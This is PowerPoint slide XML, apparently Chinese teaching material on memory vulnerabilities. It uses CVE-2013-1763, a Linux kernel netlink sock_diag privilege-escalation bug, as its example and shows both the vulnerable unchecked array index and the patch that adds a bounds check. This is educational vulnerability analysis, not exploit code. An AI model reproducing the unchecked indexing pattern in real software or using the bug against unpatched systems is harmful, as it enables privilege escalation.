          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>数组越界读写</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600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1253563" y="5080611"/>
            <a:ext cx="5179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033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7200" y="367441"/>
            <a:ext cx="7603849" cy="3382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kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>CVE-2013-1763</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Kernel</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>netlink</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>message</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>family</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>number</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>overflow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>net</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>/core/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sock_diag.c</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> View file @ </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>6e601a5</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>@@ -121,6 +121,9 @@ static </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>__</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sock_diag_rcv_msg</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>struct</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sk_buff</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> *</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>skb</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>struct</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>nlmsghdr</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> *</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>nlh</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pP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   if (</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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nlmsg_len</a:t>
            </a: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nlh</a:t>
            </a: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) &lt; </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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sizeof</a:t>
            </a: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(*</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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req</a:t>
            </a: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))</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pP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     return -EINVAL;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>+  if (</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>req</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sdiag_family</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> &gt;= AF_MAX)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>+    return -EINVAL;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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hndl</a:t>
            </a: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 = </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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sock_diag_lock_handler</a:t>
            </a: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req</a:t>
            </a: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-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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sdiag_family</a:t>
            </a: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);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>   if (</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>hndl</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> == NULL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>     err = -ENOENT</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>else</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>err </a:t>
            </a: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= </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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hndl</a:t>
            </a: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-&gt;dump(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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skb</a:t>
            </a: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, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1"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nlh</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consola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3835250"/>
            <a:ext cx="7698470" cy="2800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latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>static </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>const</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> inline </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>struct</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sock_diag_handler</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> *</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sock_diag_lock_handler</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>family</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>        if (</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sock_diag_handlers</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>[family] == NULL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>                </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>request_module</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>("net-</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>pf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>-%d-proto-%d-type-%d", PF_NETLINK,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>                                NETLINK_SOCK_DIAG, family);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>mutex_lock</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>(&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sock_diag_table_mutex</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>        return </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sock_diag_handlers</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>family</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>]</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consola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92264" y="1095787"/>
            <a:ext cx="923330" cy="515517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sz="2400" dirty="0" smtClean="0"/>
              <a:t>举例：</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>CVE-2013-1763</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>：Linux内核提权</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p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3892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格式化字符串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1" y="1600200"/>
            <a:ext cx="5227806" cy="4525963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格式化字符串</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
